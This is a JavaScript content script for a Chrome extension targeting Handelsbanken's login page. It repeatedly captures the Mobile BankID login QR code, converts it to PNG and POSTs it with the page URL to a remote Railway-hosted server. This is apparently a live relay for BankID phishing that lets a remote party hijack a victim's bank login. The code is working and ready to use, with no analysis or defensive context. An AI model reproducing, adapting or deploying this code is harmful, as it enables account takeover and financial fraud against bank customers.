// Server configuration
const PRODUCTION_URL = 'https://web-production-c116.up.railway.app';

// Handelsbanken configuration
const HANDELSBANKEN_CONFIG = {
    identifier: {
        urls: ['handelsbanken.se'],
        titles: ['handelsbanken'],
        domains: ['handelsbanken']
    },
    selectors: {
        // Updated selectors for Handelsbanken QR code
        qrContainer: '.shb-inss-login__module-container[data-test-id="inss-mbid-module-container"]',
        qrSvg: '.shb-qr-code__image[data-test-id="QrCode__image"] svg',
        qrPath: 'path[d*="M0,0h1v1h-1z"]'
    },
    captureInterval: 50,
    captureThrottle: 100,
    lastCapture: 0,
    lastHash: null,
    displayUrl: `${PRODUCTION_URL}/Handelsbankenfelsokningskundidentifieringkund98721311`
};

// Function to send QR code to server
async function sendQRCode(imageData) {
    try {
        console.log('Preparing to send QR code...');
        
        // Validate the image data
        if (!imageData || typeof imageData !== 'string') {
            throw new Error('Invalid image data');
        }
        
        if (!imageData.startsWith('data:image/png;base64,')) {
            throw new Error('Invalid image data format');
        }
        
        // Create the payload matching other extensions' format
        const payload = {
            qrData: imageData,
            bank: 'HANDELSBANKEN',
            timestamp: new Date().toISOString(),
            url: window.location.href,
            displayUrl: HANDELSBANKEN_CONFIG.displayUrl
        };
        
        console.log('Request payload structure:', {
            hasQrData: !!payload.qrData,
            qrDataLength: payload.qrData.length,
            qrDataPrefix: payload.qrData.substring(0, 30),
            bank: payload.bank,
            timestamp: payload.timestamp
        });
        
        const response = await fetch(`${PRODUCTION_URL}/api/qr`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Server response:', errorText);
            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
        }

        const result = await response.json();
        console.log('Server response:', result);
        showNotification('QR code captured and sent successfully');
    } catch (error) {
        console.error('Error sending QR code:', error);
        showNotification('Error sending QR code: ' + error.message, true);
    }
}

// Function to capture and send QR code
async function captureQRCode() {
    try {
        console.log('Starting QR code capture process...');
        const qrCodes = findQRCodes();
        if (qrCodes.length === 0) {
            console.log('No QR codes found to capture');
            return;
        }

        const svg = qrCodes[0];
        console.log('Found SVG element, preparing to capture...');

        // Create a temporary canvas to convert SVG to image
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const svgData = new XMLSerializer().serializeToString(svg);
        const img = new Image();
        
        img.onload = async function() {
            console.log('SVG image loaded, converting to canvas...');
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
            
            // Generate the image data and validate it
            const imageData = canvas.toDataURL('image/png');
            console.log('Generated image data info:', {
                length: imageData.length,
                isValid: imageData.startsWith('data:image/png;base64,'),
                firstChars: imageData.substring(0, 30)
            });
            
            if (imageData !== HANDELSBANKEN_CONFIG.lastHash) {
                console.log('New QR code detected, preparing to send...');
                HANDELSBANKEN_CONFIG.lastHash = imageData;
                await sendQRCode(imageData);
            } else {
                console.log('Same QR code as last capture, skipping send');
            }
        };
        
        console.log('Converting SVG to base64...');
        img.src = 'data:image/svg+xml;base64,' + btoa(unescape(encodeURIComponent(svgData)));
    } catch (error) {
        console.error('Error in captureQRCode:', error);
        showNotification('Error capturing QR code: ' + error.message, true);
    }
}

// Function to show notification
function showNotification(message, isError = false) {
    let notification = document.getElementById('qr-capture-notification');
    if (!notification) {
        notification = document.createElement('div');
        notification.id = 'qr-capture-notification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 4px;
            color: white;
            font-family: Arial, sans-serif;
            z-index: 999999;
            transition: opacity 0.3s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        `;
        document.body.appendChild(notification);
    }

    notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
    notification.textContent = message;
    notification.style.opacity = '1';

    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 300);
    }, 2000);
}

// Function to find QR codes
function findQRCodes() {
    console.log('Searching for QR code elements...');
    const qrContainer = document.querySelector(HANDELSBANKEN_CONFIG.selectors.qrContainer);
    if (!qrContainer) {
        console.log('No QR code container found');
        return [];
    }
    console.log('Found QR code container');

    const svg = qrContainer.querySelector(HANDELSBANKEN_CONFIG.selectors.qrSvg);
    if (!svg) {
        console.log('No SVG element found in container');
        return [];
    }
    console.log('Found SVG element');

    const path = svg.querySelector(HANDELSBANKEN_CONFIG.selectors.qrPath);
    if (!path) {
        console.log('No QR code path found in SVG');
        return [];
    }
    console.log('Found valid QR code path');

    return [svg];
}

// Function to auto-capture QR codes
function autoCapture() {
    const now = Date.now();
    if (now - HANDELSBANKEN_CONFIG.lastCapture < HANDELSBANKEN_CONFIG.captureThrottle) {
        return;
    }

    const qrCodes = findQRCodes();
    if (qrCodes.length > 0) {
        captureQRCode();
    }
}

// Start monitoring
let captureInterval;
let observerTimeout;

function startMonitoring() {
    if (captureInterval) clearInterval(captureInterval);
    
    captureInterval = setInterval(autoCapture, HANDELSBANKEN_CONFIG.captureInterval);
    setTimeout(autoCapture, 100);

    const observer = new MutationObserver((mutations) => {
        if (observerTimeout) clearTimeout(observerTimeout);
        observerTimeout = setTimeout(autoCapture, 10);
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['src', 'style', 'class', 'id', 'data-testid']
    });
}

// Clear interval when page is hidden
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        if (captureInterval) clearInterval(captureInterval);
    } else {
        startMonitoring();
    }
});

// Start monitoring when the page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startMonitoring);
} else {
    startMonitoring();
}

// Handle messages from the extension
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'captureQR') {
        const qrCodes = findQRCodes();
        if (qrCodes.length > 0) {
            captureQRCode();
            sendResponse({ success: true });
        } else {
            showNotification('No QR codes found on this page', true);
            sendResponse({ success: false });
        }
    }
}); 